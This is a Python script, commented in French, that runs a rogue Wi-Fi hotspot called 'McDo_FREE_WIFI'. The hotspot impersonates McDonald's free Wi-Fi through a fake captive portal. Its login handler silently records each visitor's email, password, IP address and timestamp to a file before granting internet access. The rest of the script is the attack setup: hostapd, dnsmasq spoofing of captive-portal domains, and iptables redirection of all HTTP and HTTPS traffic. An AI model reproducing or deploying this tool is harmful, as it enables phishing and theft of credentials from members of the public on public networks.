#!/usr/bin/env python3

import os
import sys
import subprocess
import time
from flask import Flask, render_template, request, redirect, send_from_directory
import threading
import argparse
import netifaces

app = Flask(__name__)

# Liste des clients autorisés (après connexion)
authorized_clients = set()

# Variables globales
internet_interface = None
wifi_interface = None
gateway_ip = None

@app.route('/')
def index():
    print(f"[DEBUG] Access to / from {request.remote_addr}")
    return redirect('/login')

# Routes for captive portal detection - ALL of these are important
@app.route('/generate_204')
@app.route('/ncsi.txt')
@app.route('/hotspot-detect.html')
@app.route('/canonical.html')
@app.route('/connecttest.txt')
@app.route('/redirect')
@app.route('/success.txt')
@app.route('/test.txt')
@app.route('/msftconnecttest.com')
@app.route('/apple.com')
@app.route('/mobile/status.php')
@app.route('/gen_204')
@app.route('/kindle-wifi/wifistub.html')
@app.route('/check_network_status.txt')
@app.route('/network_check.txt')

def redirect_to_login():
    client_ip = request.remote_addr
    print(f"[DEBUG] Captive portal detection from {client_ip} via {request.path}")
    
    if client_ip in authorized_clients:
        print(f"[DEBUG] Client {client_ip} is authorized")
        return '', 204
    
    print(f"[DEBUG] Redirecting {client_ip} to login page")
    return redirect('http://192.168.1.1/login', code=302)

@app.route('/login', methods=['GET', 'POST'])
def login():

    print(f"[DEBUG] Login page access from {request.remote_addr} - Method: {request.method}")
    if request.method == 'POST':
        email = request.form.get('email')
        password = request.form.get('password')
        client_ip = request.remote_addr
        
        print(f"[DEBUG] Login attempt from {client_ip} with email: {email}")
        
        with open('captured.txt', 'a') as f:
            f.write(f"\nEmail: {email}\nPassword: {password}\n")
            f.write(f"IP: {client_ip}\nDate: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write("-" * 50 + "\n")
        
        # Autoriser l'accès Internet pour ce client
        authorized_clients.add(client_ip)
        print(f"[DEBUG] Added {client_ip} to authorized clients")
        print(f"[DEBUG] Current authorized clients: {authorized_clients}")
        
        # Configurer les règles iptables pour ce client
        allow_internet_access(client_ip)
        
        return redirect('/success')
    return render_template('login.html')

@app.route('/success')
def success():
    return """
    <html><body style='font-family: Arial, sans-serif; text-align: center; padding: 50px;'>
        <h2 style='color: #2c2c2c;'>Connexion réussie!</h2>
        <p>Vous êtes maintenant connecté au Wi-Fi McDonald's.</p>
        <p>Redirection vers McDonald's...</p>
        <div style='width: 50px; height: 50px; border: 4px solid #ffbc0d; border-top: 4px solid #f3f3f3; 
                    border-radius: 50%; margin: 20px auto; animation: spin 1s linear infinite;'></div>
        <style>
            @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        </style>
        <meta http-equiv="refresh" content="3;url=https://www.mcdonalds.fr">
    </body></html>
    """
@app.route('/logo.png')
def serve_logo():
    """Serve the logo file from the templates directory"""
    try:
        return send_from_directory('templates', 'logo.png', mimetype='image/png')
    except Exception as e:
        print(f"[ERROR] Failed to serve logo: {e}")
        return "Logo not found", 404
        
def allow_internet_access(client_ip):
    """Configurer iptables pour permettre l'accès Internet pour un client spécifique"""
    global internet_interface
    print(f"[DEBUG] Configuring internet access for {client_ip}")
    
    try:
        # Remove captive portal redirection for this client
        os.system(f"iptables -t nat -I PREROUTING 1 -s {client_ip} -j ACCEPT")
        
        # Allow forwarding for this client
        os.system(f"iptables -I FORWARD 1 -s {client_ip} -j ACCEPT")
        os.system(f"iptables -I FORWARD 1 -d {client_ip} -j ACCEPT")
        
        # Add specific NAT rule for this client
        os.system(f"iptables -t nat -A POSTROUTING -s {client_ip} -o {internet_interface} -j MASQUERADE")
        
        print(f"[DEBUG] Internet access enabled for {client_ip}")
        print("[DEBUG] Current iptables rules:")
        os.system("iptables -L -v -n")
        os.system("iptables -t nat -L -v -n")
        
    except Exception as e:
        print(f"[ERROR] Failed to configure iptables: {e}")

def detect_wifi_interface():
    """Détecte l'interface WiFi"""
    try:
        # Vérifier d'abord wlan0
        if os.path.exists('/sys/class/net/wlan0'):
            return 'wlan0'
        
        # Sinon chercher une interface wireless
        for iface in netifaces.interfaces():
            try:
                if os.path.exists(f'/sys/class/net/{iface}/wireless'):
                    return iface
            except:
                continue
    except:
        pass
    return None

def get_default_gateway():
    """Détecte la passerelle par défaut et l'interface Internet"""
    try:
        gws = netifaces.gateways()
        default = gws.get('default', {}).get(netifaces.AF_INET, None)
        if default:
            return default[0], default[1]  # gateway_ip, interface
    except:
        pass
    return None, None

def get_interface_ip(interface):
    """Obtient l'adresse IP d'une interface"""
    try:
        return netifaces.ifaddresses(interface)[netifaces.AF_INET][0]['addr']
    except:
        return None

def detect_internet_interface():
    """Détecte l'interface connectée à Internet"""
    try:
        # Obtenir la gateway par défaut et son interface
        gateway_ip, interface = get_default_gateway()
        if interface:
            return interface, gateway_ip
            
        # Si pas trouvé, chercher eth0
        if os.path.exists('/sys/class/net/eth0'):
            return 'eth0', get_interface_ip('eth0')
    except:
        pass
    
    return None, None

def setup_ap(interface):
    internet_iface = "eth0"
    gateway = "192.168.211.2"
    
    # Kill any existing processes
    os.system("killall hostapd dnsmasq 2>/dev/null")
    os.system("fuser -k 80/tcp 2>/dev/null")
    
    # Configuration réseau initiale
    print("[INFO] Configuration de l'interface WiFi...")
    os.system(f"ifconfig {interface} down")
    os.system(f"iwconfig {interface} mode monitor")
    os.system(f"ifconfig {interface} up")
    os.system(f"ifconfig {interface} 192.168.1.1 netmask 255.255.255.0")
    
    # Vérifier que l'interface est bien configurée
    if os.system(f"ifconfig {interface} | grep -q '192.168.1.1'") != 0:
        print(f"[ERROR] Échec de la configuration de l'interface {interface}")
        return False
    
    # Configuration du routage
    print("[INFO] Configuration du routage...")
    os.system("ip route flush all")
    
    # Add routes in specific order
    os.system(f"ip route add 192.168.1.0/24 dev {interface} src 192.168.1.1")
    os.system(f"ip route add 192.168.211.0/24 dev {internet_iface}")
    os.system(f"ip route add default via {gateway} dev {internet_iface}")
    
    # hostapd configuration
    print("[INFO] Configuration de hostapd...")
    with open('hostapd.conf', 'w') as f:
        f.write(f"""interface={interface}
driver=nl80211
ssid=McDo_FREE_WIFI
hw_mode=g
channel=6
auth_algs=1
ieee80211n=1
wmm_enabled=1
logger_syslog=-1
logger_syslog_level=2
logger_stdout=-1
logger_stdout_level=2""")
    
    # dnsmasq configuration
    print("[INFO] Configuration de dnsmasq...")
    with open('dnsmasq.conf', 'w') as f:
        f.write(f"""interface={interface}
dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,8.8.8.8,8.8.4.4
server=8.8.8.8
server=8.8.4.4
no-resolv
log-queries
log-dhcp
bind-interfaces
listen-address=192.168.1.1
# Captive portal domains
address=/captive.apple.com/192.168.1.1
address=/connectivitycheck.gstatic.com/192.168.1.1
address=/connectivitycheck.android.com/192.168.1.1
address=/clients3.google.com/192.168.1.1
address=/msftconnecttest.com/192.168.1.1
address=/www.msftconnecttest.com/192.168.1.1
address=/www.msftncsi.com/192.168.1.1
address=/network-test.com/192.168.1.1
address=/www.network-test.com/192.168.1.1""")
    
    # Clear all iptables rules
    os.system("iptables -F")
    os.system("iptables -t nat -F")
    os.system("iptables -t mangle -F")
    
    # Enable IP forwarding
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    
    # Default policies
    os.system("iptables -P INPUT ACCEPT")
    os.system("iptables -P FORWARD ACCEPT")
    os.system("iptables -P OUTPUT ACCEPT")
    
    # Allow DNS and DHCP
    os.system("iptables -A INPUT -p udp --dport 53 -j ACCEPT")
    os.system("iptables -A INPUT -p udp --dport 67 -j ACCEPT")
    os.system("iptables -A FORWARD -p udp --dport 53 -j ACCEPT")
    os.system("iptables -A FORWARD -p tcp --dport 53 -j ACCEPT")
    
    # Allow established connections
    os.system("iptables -A FORWARD -m state --state ESTABLISHED,RELATED -j ACCEPT")
    
    # Allow access to the captive portal
    os.system(f"iptables -A FORWARD -i {interface} -d 192.168.1.1 -j ACCEPT")
    
    # NAT configuration
    os.system(f"iptables -t nat -A POSTROUTING -o {internet_iface} -j MASQUERADE")
    
    # Redirect HTTP/HTTPS to captive portal for non-authorized clients
    os.system(f"iptables -t nat -A PREROUTING -i {interface} -p tcp --dport 80 -j DNAT --to-destination 192.168.1.1:80")
    os.system(f"iptables -t nat -A PREROUTING -i {interface} -p tcp --dport 443 -j DNAT --to-destination 192.168.1.1:80")
    
    # Block all other traffic from unauthorized clients
    os.system(f"iptables -A FORWARD -i {interface} -j DROP")
    
    print("[INFO] Configuration iptables terminée")
    print("[DEBUG] Règles iptables actuelles:")
    os.system("iptables -L -v -n")
    os.system("iptables -t nat -L -v -n")
    
    return True

def cleanup():
    """Nettoyer la configuration lors de l'arrêt"""
    global wifi_interface
    
    print("\n[INFO] Nettoyage en cours...")
    
    # Kill processes
    os.system("killall hostapd dnsmasq 2>/dev/null")
    os.system("fuser -k 80/tcp 2>/dev/null")
    
    # Clear iptables
    os.system("iptables -F")
    os.system("iptables -t nat -F")
    os.system("iptables -t mangle -F")
    
    # Disable IP forwarding
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
    
    if wifi_interface:
        os.system(f"ifconfig {wifi_interface} down")
        os.system(f"ifconfig {wifi_interface} up")
    
    # Restore routing
    os.system("ip route flush all")
    os.system("systemctl restart NetworkManager")
    
    print("[INFO] Nettoyage terminé")

def main():
    if os.geteuid() != 0:
        print("Ce script doit être exécuté en tant que root!")
        sys.exit(1)

    interface = "wlan0"  # Changez selon votre interface
    
    try:
        if not setup_ap(interface):
            print("[ERROR] Échec de la configuration du point d'accès")
            cleanup()
            sys.exit(1)
        
        # Démarrage des services
        print("[INFO] Démarrage de hostapd...")
        hostapd_proc = subprocess.Popen(["hostapd", "-B", "hostapd.conf"])
        time.sleep(2)
        
        print("[INFO] Démarrage de dnsmasq...")
        dnsmasq_proc = subprocess.Popen(["dnsmasq", "-C", "dnsmasq.conf", "-d"])
        time.sleep(2)
        
        # Vérifier que les services sont bien démarrés
        if os.system("pgrep hostapd >/dev/null") != 0:
            print("[ERROR] Échec du démarrage de hostapd")
            cleanup()
            sys.exit(1)
            
        if os.system("pgrep dnsmasq >/dev/null") != 0:
            print("[ERROR] Échec du démarrage de dnsmasq")
            cleanup()
            sys.exit(1)
        
        print(f"Point d'accès 'McDo_FREE_WIFI' démarré sur {interface}")
        print("Portail captif en cours d'exécution sur http://192.168.1.1")
        print("Appuyez sur Ctrl+C pour arrêter...")
        
        # Démarrage du serveur web avec debug
        print("Démarrage du serveur Flask...")
        app.debug = True
        app.run(host='0.0.0.0', port=80, debug=True, use_reloader=False)
        
    except KeyboardInterrupt:
        print("\nArrêt du point d'accès...")
        cleanup()
        print("Arrêt terminé.")
    except Exception as e:
        print(f"Erreur: {e}")
        cleanup()

def parse_arguments():
    """Parse les arguments de ligne de commande"""
    parser = argparse.ArgumentParser(description='Configuration du Point d\'Accès WiFi')
    parser.add_argument('--interface', default='wlan0', help='Interface WiFi à utiliser (ex: wlan0, wlo1)')
    parser.add_argument('--internet-interface', help='Interface connectée à Internet (ex: eth0)')
    parser.add_argument('--gateway', help='Adresse IP de la passerelle')
    parser.add_argument('--ip', default='192.168.1.1', help='Adresse IP du point d\'accès')
    args = parser.parse_args()
    
    # Détection automatique de l'interface WiFi si non spécifiée
    if not args.interface:
        args.interface = get_wifi_interface()
        if not args.interface:
            print("[ERROR] Aucune interface WiFi détectée. Utilisez --interface pour la spécifier.")
            sys.exit(1)
    
    return args

if __name__ == "__main__":
    main() 
